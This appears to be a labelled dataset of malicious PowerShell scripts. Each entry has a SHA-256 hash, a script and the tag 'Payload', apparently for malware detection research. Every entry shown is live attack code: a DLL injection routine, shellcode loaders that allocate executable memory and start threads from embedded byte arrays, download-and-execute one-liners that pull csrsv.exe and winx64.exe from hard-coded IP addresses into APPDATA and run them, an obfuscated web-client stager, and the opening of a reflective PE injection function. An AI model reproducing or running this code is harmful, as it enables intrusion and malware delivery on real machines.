    $Result = $RtlCreateUserThread.Invoke($hProcess, [IntPtr]::Zero, $False, 0, [IntPtr]::Zero, [IntPtr]::Zero, $LoadLibraryAddr, $RemoteMemAddr, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($Result)
    {
        Throw ""Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8'))""
    }
    
    $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null 

    
    $CloseHandle.Invoke($hProcess) | Out-Null

    Start-Sleep -Seconds 2

    
    $FileName = (Split-Path $Dll -Leaf).ToLower()
    $DllInfo = (Get-Process -Id $ProcessID).Modules | ? { $_.FileName.ToLower().Contains($FileName) }

    if (!$DllInfo)
    {
        Throw ""Dll did dot inject properly into the victim process.""
    }

    Write-Verbose 'Dll injection complete!'

    $DllInfo
}
",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
8b4ac96bf6c95431604cdd0e22f749bdb9cb06eebf8ea427f5f14f2927f60201,"
$uIl = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $uIl -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc9,0xb8,0xcf,0x60,0x70,0x7d,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,0x42,0x18,0x83,0xea,0x33,0x82,0x85,0x81,0x23,0xc1,0x66,0x7a,0xb3,0xa6,0xef,0x9f,0x82,0xe6,0x94,0xd4,0xb4,0xd6,0xdf,0xb9,0x38,0x9c,0xb2,0x29,0xcb,0xd0,0x1a,0x5d,0x7c,0x5e,0x7d,0x50,0x7d,0xf3,0xbd,0xf3,0xfd,0x0e,0x92,0xd3,0x3c,0xc1,0xe7,0x12,0x79,0x3c,0x05,0x46,0xd2,0x4a,0xb8,0x77,0x57,0x06,0x01,0xf3,0x2b,0x86,0x01,0xe0,0xfb,0xa9,0x20,0xb7,0x70,0xf0,0xe2,0x39,0x55,0x88,0xaa,0x21,0xba,0xb5,0x65,0xd9,0x08,0x41,0x74,0x0b,0x41,0xaa,0xdb,0x72,0x6e,0x59,0x25,0xb2,0x48,0x82,0x50,0xca,0xab,0x3f,0x63,0x09,0xd6,0x9b,0xe6,0x8a,0x70,0x6f,0x50,0x77,0x81,0xbc,0x07,0xfc,0x8d,0x09,0x43,0x5a,0x91,0x8c,0x80,0xd0,0xad,0x05,0x27,0x37,0x24,0x5d,0x0c,0x93,0x6d,0x05,0x2d,0x82,0xcb,0xe8,0x52,0xd4,0xb4,0x55,0xf7,0x9e,0x58,0x81,0x8a,0xfc,0x34,0x66,0xa7,0xfe,0xc4,0xe0,0xb0,0x8d,0xf6,0xaf,0x6a,0x1a,0xba,0x38,0xb5,0xdd,0xbd,0x12,0x01,0x71,0x40,0x9d,0x72,0x5b,0x86,0xc9,0x22,0xf3,0x2f,0x72,0xa9,0x03,0xd0,0xa7,0x44,0x01,0x46,0x88,0x31,0x43,0x10,0x60,0x40,0x54,0x1d,0xcc,0xcd,0xb2,0x4d,0x7e,0x9e,0x6a,0x2d,0x2e,0x5e,0xdb,0xc5,0x24,0x51,0x04,0xf5,0x46,0xbb,0x2d,0x9f,0xa8,0x12,0x05,0x37,0x50,0x3f,0xdd,0xa6,0x9d,0x95,0x9b,0xe8,0x16,0x1a,0x5b,0xa6,0xde,0x57,0x4f,0x5e,0x2f,0x22,0x2d,0xc8,0x30,0x98,0x58,0xf4,0xa4,0x27,0xcb,0xa3,0x50,0x2a,0x2a,0x83,0xfe,0xd5,0x19,0x98,0x37,0x40,0xe2,0xf6,0x37,0x84,0xe2,0x06,0x6e,0xce,0xe2,0x6e,0xd6,0xaa,0xb0,0x8b,0x19,0x67,0xa5,0x00,0x8c,0x88,0x9c,0xf5,0x07,0xe1,0x22,0x20,0x6f,0xae,0xdd,0x07,0x71,0x92,0x0b,0x61,0x07,0xfa,0x8f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$HZcE=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($HZcE.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$HZcE,0,0,0);for (;;){Start-sleep 60};

",Payload
106b08f67f8787358992330e031b9a80e0420fa57f56e66c93936031972473f5,"function Invoke-ReflectivePEInjection
{


[CmdletBinding(DefaultParameterSetName=""WebFile"")]
Param(
    [Parameter(ParameterSetName = ""LocalFile"", Position = 0, Mandatory = $true)]
    [String]
    $PEPath,
    
    [Parameter(ParameterSetName = ""WebFile"", Position = 0, Mandatory = $true)]
    [Uri]
    $PEUrl,

    [Parameter(ParameterSetName = ""Bytes"", Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [String]
    $PEbase64,
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Parameter(Position = 6)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )
    
    
    
    
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        
        
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        
        
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        
        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
